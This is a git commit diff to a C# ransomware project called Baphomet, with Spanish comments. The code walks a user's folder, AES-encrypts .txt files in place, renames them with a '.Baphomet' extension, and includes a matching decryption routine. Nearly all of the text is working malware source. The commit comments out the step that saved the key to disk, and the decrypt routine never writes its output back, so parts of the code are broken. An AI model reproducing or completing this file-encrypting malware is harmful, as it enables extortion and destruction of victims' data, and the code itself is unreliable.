837241a10cbf2f6a4edb386339918a4728554a48
javier orlando <javierbenitez2000@hotmail.com>
2019-11-26 16:09:13 -0400

    pass aes.ObJ in all methods

--- Baphomet/Decrypt.cs
+++ Baphomet/Decrypt.cs
@@ -10,14 +10,14 @@ namespace Baphomet
     public class Decrypt
     {
 
-        public static void decryptConfirm()
+        public static void decryptConfirm(SymmetricAlgorithm aes)
         {
             var userName = Environment.UserName;
             var userDir = "C:\\Users\\" + userName;
-            directoryRoad(userDir);
+            directoryRoad(userDir,aes);
         }
 
-        static void directoryRoad(string userDir)
+        static void directoryRoad(string userDir, SymmetricAlgorithm aes)
         {
             var targetPath = userDir + "\\Desktop\\test";
             var extensionCheck = new[] { ".Baphomet" };
@@ -30,48 +30,43 @@ namespace Baphomet
                 var extension = Path.GetExtension(files[i]);
                 if (extensionCheck.Contains(extension))
                 {
-                    decryptFileData(files[i], targetPath);
+                    decryptFileData(files[i], targetPath, aes);
                 }
             }
         }
 
-        static void decryptFileData(string file, string path)
+        static void decryptFileData(string file, string path, SymmetricAlgorithm aes)
         {
-            Console.WriteLine("Enter your key here:");
-            string strKey = Console.ReadLine();
+          //  Console.WriteLine("Enter your key here:");
+          //  string strKey = Console.ReadLine();
 
             byte[] bytesToBeDecrypted = File.ReadAllBytes(file);
             // byte[] passwordBytes = Encoding.UTF8.GetBytes(strKey);
-            byte[] key = Convert.FromBase64String(strKey);
+          //  byte[] key = Convert.FromBase64String(strKey);
 
-            byte[] bytesDecrypted = decryptFileByte(bytesToBeDecrypted, key);
+            byte[] bytesDecrypted = decryptFileByte(bytesToBeDecrypted, aes);
             var extension = Path.GetExtension(file);
             var result = file.Substring(0, file.Length - extension.Length);
             System.IO.File.Move(file, result);
         }
 
 
-        static byte[] decryptFileByte(byte[] bytesToBeDecrypted, byte[] key)
+        static byte[] decryptFileByte(byte[] bytesToBeDecrypted, SymmetricAlgorithm aes)
         {
             byte[] decryptedBytes = null;
+            ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);
+
             using (MemoryStream ms = new MemoryStream())
             {
-                using (RijndaelManaged AES = new RijndaelManaged())
+              
+                using (var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Write))
                 {
-
-                    AES.BlockSize = 128;
-                    AES.Key = key;
-
-                    AES.Mode = CipherMode.CBC;
-
-                    using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
-                    {
-                        cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
-                        cs.Close();
-                    }
-                    decryptedBytes = ms.ToArray();
-
+                    cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
+                    cs.Close();
                 }
+                decryptedBytes = ms.ToArray();
+
+               
             }
             return decryptedBytes;
         }
--- Baphomet/Program.cs
+++ Baphomet/Program.cs
@@ -11,20 +11,20 @@ namespace Baphomet
         static void Main()
         {
             // creo una instancia del algoritmo aes 
-            SymmetricAlgorithm aes = new AesManaged();
-
+            RijndaelManaged aes = new RijndaelManaged();
+            aes.Mode = CipherMode.CBC;
             byte[] key = aes.Key;
 
             var userName = Environment.UserName;
             var computerName = System.Environment.MachineName.ToString();
             var  userDir = "C:\\Users\\" +userName;
 
-            directoryRoad(userDir,key);
-            decryptConfirm();
+            directoryRoad(userDir,aes);
+            decryptConfirm(aes);
         }
 
         //recoro los directorios
-        static void directoryRoad(string userdir, byte[] key)
+        static void directoryRoad(string userdir, SymmetricAlgorithm aes)
         {
            // var Dirs = new[] { "\\Documents", "\\Desktop" };
             var extensionCheck = new[] { ".txt" };
@@ -38,49 +38,44 @@ namespace Baphomet
                 var extension = Path.GetExtension(files[i]);
                 if (extensionCheck.Contains(extension))
                 {
-                    encryptFileData(files[i], key, targetPath);
+                    encryptFileData(files[i], aes, targetPath);
                 }
             }
 
         }
 
         //archivo valido para cifrar bytes
-        static void encryptFileData(string file, byte[] key, string targetPath)
+        static void encryptFileData(string file, SymmetricAlgorithm aes, string targetPath)
         {
             byte[] encryptFileBites = File.ReadAllBytes(file);
 
-            var encryptedBytes = UseAES(encryptFileBites, key);
+            var encryptedBytes = UseAES(encryptFileBites, aes);
             File.WriteAllBytes(file, encryptedBytes);
             System.IO.File.Move(file, file + ".Baphomet");
 
-            var saveKey = Convert.ToBase64String(key,0,key.Length);
-            File.WriteAllText(targetPath+"\\yourkey.txt", saveKey);
+            //var saveKey = Convert.ToBase64String(key,0,key.Length);
+           // File.WriteAllText(targetPath+"\\yourkey.txt", saveKey);
 
         }
 
 
         //Cifro los bytes de el archivo
-        static byte[] UseAES(byte[] fileBytes, byte[] key)
+        static byte[] UseAES(byte[] fileBytes, SymmetricAlgorithm aes)
         {
             byte[] encryptedBytes = null;
 
-           
+            ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV);
 
-            using(MemoryStream ms = new MemoryStream())
+            using (MemoryStream ms = new MemoryStream())
             {
-                using (RijndaelManaged myAES = new RijndaelManaged())
+                
+                using (var cryptStream = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                 {
-                    myAES.BlockSize = 128;
-                    myAES.Key = key;
-                    myAES.Mode = CipherMode.CBC;
-
-                    using (var cryptStream = new CryptoStream(ms, myAES.CreateEncryptor(), CryptoStreamMode.Write))
-                    {
-                        cryptStream.Write(fileBytes, 0, fileBytes.Length);
-                        cryptStream.Close();
-                    }
-                    encryptedBytes = ms.ToArray();
+                    cryptStream.Write(fileBytes, 0, fileBytes.Length);
+                    cryptStream.Close();
                 }
+                encryptedBytes = ms.ToArray();
+              
 
                 return encryptedBytes;
             }
